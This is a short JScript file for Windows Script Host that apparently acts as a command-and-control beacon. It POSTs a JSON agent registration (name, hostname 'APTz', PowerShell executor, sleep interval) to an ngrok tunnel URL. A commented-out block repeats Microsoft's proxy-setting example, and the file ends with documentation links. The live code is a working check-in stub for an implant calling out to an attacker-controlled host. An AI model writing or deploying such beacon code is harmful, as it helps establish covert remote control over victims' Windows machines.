// Instantiate a WinHttpRequest object.
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
// Initialize an HTTP request.  
WinHttpReq.Open("POST", "https://boomtown.ngrok.io", false);
// Post data to the HTTP server.
JSONString =  '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'

WinHttpReq.Send(JSONString);


/* Proxy Required

// HttpRequest SetCredentials flags.
HTTPREQUEST_PROXYSETTING_DEFAULT   = 0;
HTTPREQUEST_PROXYSETTING_PRECONFIG = 0;
HTTPREQUEST_PROXYSETTING_DIRECT    = 1;
HTTPREQUEST_PROXYSETTING_PROXY     = 2;

// Instantiate a WinHttpRequest object.
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

// Use proxy_server for all requests outside of 
// the microsoft.com domain.
WinHttpReq.SetProxy( HTTPREQUEST_PROXYSETTING_PROXY, 
                     "proxy_server:80", 
                     "*.microsoft.com");

// Initialize an HTTP request.  
WinHttpReq.Open("GET", "https://www.microsoft.com", false);

// Send the HTTP request.
WinHttpReq.Send(); 

// Display the response text.
WScript.Echo( WinHttpReq.ResponseText);

*/


/*
References:


https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-setproxy#examples
https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-send

*/
